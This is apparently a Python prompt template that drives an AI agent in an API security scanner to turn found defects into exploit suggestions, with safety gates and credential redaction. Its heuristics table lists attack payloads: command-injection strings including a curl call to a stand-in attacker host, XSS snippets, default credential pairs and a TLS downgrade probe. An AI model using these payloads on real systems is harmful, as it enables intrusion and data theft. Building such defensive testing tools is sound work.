...
async def generate_exploit(
    ...
    return f""" SAFETY NOTICE: You are generating exploit SUGGESTIONS only. These are text
artifacts for the user to review and decide whether to run. Do NOT execute, replay, or send
any of these requests yourself. Do NOT call bash, curl, mapi_run, or any tool that issues
HTTP to the target API. The only tools you may call in this flow are:
  mapi_defect_list, mapi_defect_replay, mapi_describe_specification, read_file, emit_exploit_report.
...
Call `mapi_defect_list` with:
  run_id = "{run_id}"

Parse the returned table: defect ID, rule, endpoint (METHOD /path).
Show the user the count and full list before proceeding.
If the list is empty, tell the user no defects were found and stop.

## Step 2 - Per-defect loop

For each defect in the list, work through steps (a)–(f):

  a. Call `mapi_defect_replay` with:
       run_id     = "{run_id}"
       defect_ids = [<this defect's ID>]
       url        = "{url}"
  ...
  b. **Reminder: you are crafting a SUGGESTION only. Do not attempt to verify the
     exploit by running it or sending any HTTP request to the API.**

  c. If the defect reproduces:
     - Note the exact reproducing request from the replay output (method, path, parameters).
     - If `{specification}` is provided, call `mapi_describe_specification` to get the
       parameter table for the endpoint.
     - If `{source_dir}` is provided, use `read_file` to locate the handler code and
       identify the injection sink or business-logic flaw.
     - Apply the defect-class heuristic from the table below to craft the exploit request.

  d. Destructive classification:
     Tag the finding `destructive=true` if the exploit request would: delete or modify
     server-side state, transfer funds, create/modify accounts, write/delete files, or
     cause a DoS. Read-only exfiltration, reconnaissance, and reflection are NOT destructive.
     When uncertain, default to destructive=true.

  e. **[DESTRUCTIVE] gate:** If destructive=true for this defect, ask the user explicitly:
     "Defect <id> (`<rule>` on `<endpoint>`) has a destructive exploit suggestion -
      it would [briefly describe the action, e.g., 'delete all rows in the users table'].
      Include this in the report? (yes/no)"
     Do NOT set destructive=true in the finding or include it without an explicit yes.

  f. Before adding this finding to the report, review the `exploit_request` string.
     Replace any credential values, bearer tokens, session cookies, or API keys you
     observed in the replay output with typed placeholders:
  ...
  g. Accumulate all findings (reproduced and skipped) for Step 3.

---

## Defect-class heuristics

Use these as starting guidance. Adapt to the specific endpoint, parameter names, and
source code if available:

| Rule | Exploit approach | Destructive? |
|---|---|---|
...
| `command-injection` | `;id`, `$(id)`, `` `id` ``. OOB: `; curl http://<attacker>/<marker>`. | File write/delete/spawn = YES [DESTRUCTIVE] |
| `xss` | `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`. Note: fires in any consumer that renders the response as HTML. | No |
| `default-credentials` | Try common pairs: `admin/admin`, `admin/password`, `user/user`, `test/test`. Note which pair works. | Depends - accessing admin = YES |
| `tls-*` | `openssl s_client -connect host:port -tls1` (downgrade probe). Note cipher suite and cert expiry. | No |

---

## Step 3 - Emit report

Call `emit_exploit_report` with:
  run_id      = "{run_id}"
  findings    = <list of all per-defect finding dicts from Step 2>
  output_path = "{output_path}"

After the tool returns:

** Tell the user:**
"The report at `{output_path}` contains exploit suggestions.
Do NOT run any of these requests without carefully reviewing them first and
obtaining appropriate authorization. Requests tagged [DESTRUCTIVE] would modify
or delete server state and require particular caution."

Show a brief summary: how many defects were found, how many reproduced, how many
were skipped, and whether any are tagged [DESTRUCTIVE].

---

**Implementation notes:**
- NEVER call bash, mapi_run, or any HTTP tool against the target API during this flow.
- Auth for mapi_defect_replay comes from the original scan's current_args - do not prompt the user.
- exploit_request is TEXT ONLY. It is a string describing the request - not an executable call.
- Placeholder convention: <BEARER_TOKEN>, <API_KEY>, <PASSWORD>, <SESSION_COOKIE>, <SECRET_VALUE>.
- When in doubt about destructive classification, default to destructive=true and ask the user.
- source_dir is optional - if not provided, craft the exploit from replay output and defect-class heuristics alone.
"""
